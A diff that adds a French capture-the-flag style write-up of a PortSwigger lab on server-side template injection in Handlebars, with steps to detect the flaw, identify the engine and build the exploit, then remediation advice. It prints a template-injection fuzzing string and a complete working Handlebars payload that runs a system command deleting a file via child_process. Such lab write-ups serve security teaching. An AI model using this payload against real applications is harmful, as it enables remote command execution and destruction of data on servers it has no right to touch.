@@ -392,7 +392,90 @@ Pour se protéger contre cette vulnérabilité, il faudrait améliorer le filtra
 
 ### 9 |
 
-### 10 |
+### 10 | Server-Side Template Injection (SSTI)
+
+[Lien](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
+
+Le SSTI (Server-Side Template Injection) est une vulnérabilité qui permet d'injecter du code malveillant dans un moteur de templates côté serveur. Si les entrées utilisateur ne sont pas correctement validées, on peut exécuter du code arbitraire sur le serveur.
+
+#### Step 1 : Identification de la vulnérabilité
+
+En cliquant sur "View details" d'un produit, on remarque que le message "Unfortunately this product is out of stock" est affiché via le paramètre `message` dans l'URL :
+
+```
+?message=Unfortunately%20this%20product%20is%20out%20of%20stock
+```
+
+Pour tester si le site est vulnérable au SSTI, on injecte une chaîne de fuzzing contenant différentes syntaxes de templates :
+
+```
+?message=${{<%[%'"}}%\
+```
+
+Un message d'erreur apparaît, confirmant la vulnérabilité SSTI.
+
+#### Step 2 : Identification du moteur de templates
+
+En analysant les messages d'erreur et en testant différentes syntaxes, on identifie que le moteur utilisé est **Handlebars** (Node.js).
+
+Syntaxe Handlebars :
+```handlebars
+{{expression}}
+{{#with variable}}...{{/with}}
+```
+
+#### Step 3 : Recherche d'un exploit
+
+En recherchant "Handlebars SSTI exploit", on trouve un exploit connu qui permet d'exécuter des commandes système en manipulant les fonctions internes de JavaScript.
+
+L'exploit utilise :
+- `lookup string.sub "constructor"` pour accéder au constructeur de Function
+- `require('child_process')` pour exécuter des commandes système
+
+#### Step 4 : Construction du payload
+
+Le payload exploite les blocs `{{#with}}` de Handlebars pour créer une fonction malveillante qui supprime le fichier `/home/carlos/morale.txt` :
+
+Payload (non encodé) :
+```handlebars
+wrtz{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+```
+
+#### Step 5 : Exécution de l'exploit
+
+On envoie le payload URL-encodé dans le paramètre `message`. Le serveur interprète le template Handlebars, exécute le code JavaScript côté serveur, et la commande `rm /home/carlos/morale.txt` est lancée.
+
+Le fichier est supprimé avec succès et le challenge est validé.
+
+#### Remédiation
+
+Pour se protéger contre les vulnérabilités SSTI :
+
+1. **Ne jamais concaténer les entrées utilisateur dans les templates** : Utiliser uniquement des variables de contexte
+2. **Valider et sanitiser toutes les entrées** : Bloquer les patterns dangereux (`{{`, `constructor`, `require`, etc.)
+3. **Utiliser un mode sandbox** : Limiter l'accès aux fonctionnalités dangereuses du moteur de templates
+4. **Désactiver les helpers dangereux** : Supprimer ou restreindre `with`, `each`, `lookup`
+5. **Utiliser des templates statiques pré-compilés** : Éviter la compilation dynamique basée sur les entrées utilisateur
+
+[Source OWASP - SSTI](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection)
 
 ### 11 | Mass Assignment
 
